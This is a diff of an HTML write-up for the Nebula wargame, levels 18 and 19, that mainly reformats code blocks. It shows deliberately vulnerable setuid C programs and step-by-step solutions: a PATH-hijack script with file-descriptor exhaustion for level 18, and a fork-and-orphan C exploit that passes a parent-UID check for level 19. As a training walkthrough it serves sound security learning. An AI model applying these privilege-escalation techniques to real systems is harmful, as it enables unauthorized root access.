+    fp = fopen(PWFILE, "r");
+    if(fp) {
+        char file[64];
 
-                          if(fgets(file, sizeof(file) - 1, fp) == NULL) {
-                              dprintf("Unable to read password file %s\n", PWFILE);
-                              return;
-                          }
-                                    fclose(fp);
-                          if(strcmp(pw, file) != 0) return;       
-                      }
-                      dprintf("logged in successfully (with%s password file)\n",
-                          fp == NULL ? "out" : "");
-                      
-                      globals.loggedin = 1;
+        if(fgets(file, sizeof(file) - 1, fp) == NULL) {
+            dprintf("Unable to read password file %s\n", PWFILE);
+            return;
+        }
+                fclose(fp);
+        if(strcmp(pw, file) != 0) return;       
+    }
+    dprintf("logged in successfully (with%s password file)\n",
+        fp == NULL ? "out" : "");
+    
+    globals.loggedin = 1;
 
-                    }
+}
 
-                    void notsupported(char *what){
-                      char *buffer = NULL;
-                      asprintf(&buffer, "--> [%s] is unsupported at this current time.\n", what);
-                      dprintf(what);
-                      free(buffer);
-                    }
+void notsupported(char *what){
+    char *buffer = NULL;
+    asprintf(&buffer, "--> [%s] is unsupported at this current time.\n", what);
+    dprintf(what);
+    free(buffer);
+}
 
-                    void setuser(char *user){
-                      char msg[128];
+void setuser(char *user){
+    char msg[128];
 
-                      sprintf(msg, "unable to set user to '%s' -- not supported.\n", user);
-                      printf("%s\n", msg);
+    sprintf(msg, "unable to set user to '%s' -- not supported.\n", user);
+    printf("%s\n", msg);
 
-                    }
+}
 
-                    int main(int argc, char **argv, char **envp){
-                      char c;
+int main(int argc, char **argv, char **envp){
+    char c;
 
-                      while((c = getopt(argc, argv, "d:v")) != -1) {
-                          switch(c) {
-                              case 'd':
-                                  globals.debugfile = fopen(optarg, "w+");
-                                  if(globals.debugfile == NULL) err(1, "Unable to open %s", optarg);
-                                  setvbuf(globals.debugfile, NULL, _IONBF, 0);
-                                  break;
-                              case 'v':
-                                  globals.verbose++;
-                                  break;
-                          }
-                      }
+    while((c = getopt(argc, argv, "d:v")) != -1) {
+        switch(c) {
+            case 'd':
+                globals.debugfile = fopen(optarg, "w+");
+                if(globals.debugfile == NULL) err(1, "Unable to open %s", optarg);
+                setvbuf(globals.debugfile, NULL, _IONBF, 0);
+                break;
+            case 'v':
+                globals.verbose++;
+                break;
+        }
+    }
 
-                      dprintf("Starting up. Verbose level = %d\n", globals.verbose);
+    dprintf("Starting up. Verbose level = %d\n", globals.verbose);
 
-                      setresgid(getegid(), getegid(), getegid());
-                      setresuid(geteuid(), geteuid(), geteuid());
-                      
-                      while(1) {
-                          char line[256];
-                          char *p, *q;
+    setresgid(getegid(), getegid(), getegid());
+    setresuid(geteuid(), geteuid(), geteuid());
+    
+    while(1) {
+        char line[256];
+        char *p, *q;
 
-                          q = fgets(line, sizeof(line)-1, stdin);
-                          if(q == NULL) break;
-                          p = strchr(line, '\n'); if(p) *p = 0;
-                          p = strchr(line, '\r'); if(p) *p = 0;
+        q = fgets(line, sizeof(line)-1, stdin);
+        if(q == NULL) break;
+        p = strchr(line, '\n'); if(p) *p = 0;
+        p = strchr(line, '\r'); if(p) *p = 0;
 
-                          dvprintf(2, "got [%s] as input\n", line);
+        dvprintf(2, "got [%s] as input\n", line);
 
-                          if(strncmp(line, "login", 5) == 0) {
-                              dvprintf(3, "attempting to login\n");
-                              login(line + 6);
-                          } else if(strncmp(line, "logout", 6) == 0) {
-                              globals.loggedin = 0;
-                          } else if(strncmp(line, "shell", 5) == 0) {
-                              dvprintf(3, "attempting to start shell\n");
-                              if(globals.loggedin) {
-                                  execve("/bin/sh", argv, envp);
-                                  err(1, "unable to execve");
-                              }
-                              dprintf("Permission denied\n");
-                          } else if(strncmp(line, "logout", 4) == 0) {
-                              globals.loggedin = 0;
-                          } else if(strncmp(line, "closelog", 8) == 0) {
-                              if(globals.debugfile) fclose(globals.debugfile);
-                              globals.debugfile = NULL;
-                          } else if(strncmp(line, "site exec", 9) == 0) {
-                              notsupported(line + 10);
-                          } else if(strncmp(line, "setuser", 7) == 0) {
-                              setuser(line + 8);
-                          }
-                      }
+        if(strncmp(line, "login", 5) == 0) {
+            dvprintf(3, "attempting to login\n");
+            login(line + 6);
+        } else if(strncmp(line, "logout", 6) == 0) {
+            globals.loggedin = 0;
+        } else if(strncmp(line, "shell", 5) == 0) {
+            dvprintf(3, "attempting to start shell\n");
+            if(globals.loggedin) {
+                execve("/bin/sh", argv, envp);
+                err(1, "unable to execve");
+            }
+            dprintf("Permission denied\n");
+        } else if(strncmp(line, "logout", 4) == 0) {
+            globals.loggedin = 0;
+        } else if(strncmp(line, "closelog", 8) == 0) {
+            if(globals.debugfile) fclose(globals.debugfile);
+            globals.debugfile = NULL;
+        } else if(strncmp(line, "site exec", 9) == 0) {
+            notsupported(line + 10);
+        } else if(strncmp(line, "setuser", 7) == 0) {
+            setuser(line + 8);
+        }
+    }
 
-                      return 0;
-                    }
-                </pre>
+    return 0;
+}</code></pre>
 
                 <blockquote><b>void closelog():</b> closes the descriptor being used to write to the system logger.</blockquote>
                 <blockquote><b>ulimit -n:</b> set or get the shells resource usage limits. Option -n sets the maximum number of open file
@@ -1257,23 +1214,19 @@ title: Nebula
                     </li>
                     <li>
                     We create the Starting file as an executable script in /tmp, and make it open a shell:
-                        <pre class="brush: sh">
-                            #!/bin/bash
-                            /bin/getflag >> /tmp/flag18.out
-                        </pre>
+                        <pre><code class="bash">#!/bin/bash
+/bin/getflag >> /tmp/flag18.out</code></pre>
                     We make it executable with <code>chmod +x /tmp/Starting</code>. To make sure this file can be found, we prepend the /tmp to PATH: <code>export PATH=/tmp:$PATH</code>
                     </li>
                     <li>
                     It's now a good time to logout completely from the challenge and login again, just to make sure that we do all the operations in the right order:
-                        <pre class="brush: sh">
-                            tail -f /tmp/log &
-                            export PATH=/tmp:$PATH
-                            ulimit -n 4
-                            ./flag18 --init-file -d /tmp/log
-                            login
-                            closelog
-                            shell
-                        </pre>
+                        <pre><code class="bash">tail -f /tmp/log &
+export PATH=/tmp:$PATH
+ulimit -n 4
+./flag18 --init-file -d /tmp/log
+login
+closelog
+shell</code></pre>
                     At the end of these instructions we will still get an error, but it is because our --init-file option is still trying to execute the lines in the log file and is obviously failing. If we go in the /tmp folder we can see that out flag18.out file is there and it says that we executed getflag properly.
                     </li>
                     <li>
@@ -1288,35 +1241,33 @@ title: Nebula
                 <h3>Level 19</h3>
                 <h4>There is a flaw in the below program in how it operates.</h4>
                 
-                <pre class="brush: c">
-                    int main(int argc, char **argv, char **envp){
-                      pid_t pid;
-                      char buf[256];
-                      struct stat statbuf;
+                <pre><code class="cpp">int main(int argc, char **argv, char **envp){
+    pid_t pid;
+    char buf[256];
+    struct stat statbuf;
 
-                      /* Get the parent's /proc entry, so we can verify its user id */
+    /* Get the parent's /proc entry, so we can verify its user id */
 
-                      snprintf(buf, sizeof(buf)-1, "/proc/%d", getppid());
+    snprintf(buf, sizeof(buf)-1, "/proc/%d", getppid());
 
-                      /* stat() it */
+    /* stat() it */
 
-                      if(stat(buf, &statbuf) == -1) {
-                          printf("Unable to check parent process\n");
-                          exit(EXIT_FAILURE);
-                      }
+    if(stat(buf, &statbuf) == -1) {
+        printf("Unable to check parent process\n");
+        exit(EXIT_FAILURE);
+    }
 
-                      /* check the owner id */
+    /* check the owner id */
 
-                      if(statbuf.st_uid == 0) {
-                          /* If root started us, it is ok to start the shell */
+    if(statbuf.st_uid == 0) {
+        /* If root started us, it is ok to start the shell */
 
-                          execve("/bin/sh", argv, envp);
-                          err(1, "Unable to execve");
-                      }
+        execve("/bin/sh", argv, envp);
+        err(1, "Unable to execve");
+    }
 
-                      printf("You are unauthorized to run this program\n");
-                    }
-                </pre>
+    printf("You are unauthorized to run this program\n");
+}</code></pre>
 
                 <blockquote><b>init:</b> is the first process started during booting of the computer system. It is a daemon process that continues running until the system is shut down. It is the direct or indirect ancestor of all other processes and automatically adopts all orphaned processes.</blockquote>
                 <blockquote><b>pid_t fork(void):</b> creates a new process (child) by duplicating the calling process (parent).The processes run in separate memory spaces.  At the time of fork() both memory spaces have the same content.</blockquote>
@@ -1332,19 +1283,17 @@ title: Nebula
                     This means that we need a process that starts flag19 and then dies before the checks on the parent ID. This can be achieved with a <i>fork()</i>. We have to write a C program that forks itself, then we wait for this new process to become orphaned, and then we call <i>execve()</i> with the flag19 binary to run the <code>getflag</code> command in a shell with proper permissions.
                     </li>
                     <li>
-                        <pre class="brush: c">
-                            int main(int argc, char **argv, char **envp){
-                                int child = fork();
+                        <pre><code class="cpp">int main(int argc, char **argv, char **envp){
+    int child = fork();
 
-                                if(child == 0){
-                                    sleep(2);
-                                    setresuid(geteuid(), geteuid(), geteuid());
-                                    char *args[] = {"/bin/sh", "-c", "/bin/getflag", NULL};
-                                    execve("/home/flag19/flag19", args, envp);
-                                }
-                                return 0;
-                            }
-                        </pre>
+    if(child == 0){
+        sleep(2);
+        setresuid(geteuid(), geteuid(), geteuid());
+        char *args[] = {"/bin/sh", "-c", "/bin/getflag", NULL};
+        execve("/home/flag19/flag19", args, envp);
+    }
+    return 0;
+}</code></pre>
                     </li>
                     <li>
                     Compile this file with <code>gcc /tmp/flag19.c -o /tmp/flag19</code>, give it execution permissions if needed, and run it. The parent process will die upon spawn of the child, which in turn will have UID == 0 and therefore pass the check and be allowed to enter the original <i>execve</i> in the /home/flag19/flag19 program. This will execute <code>getflag</code> for us.
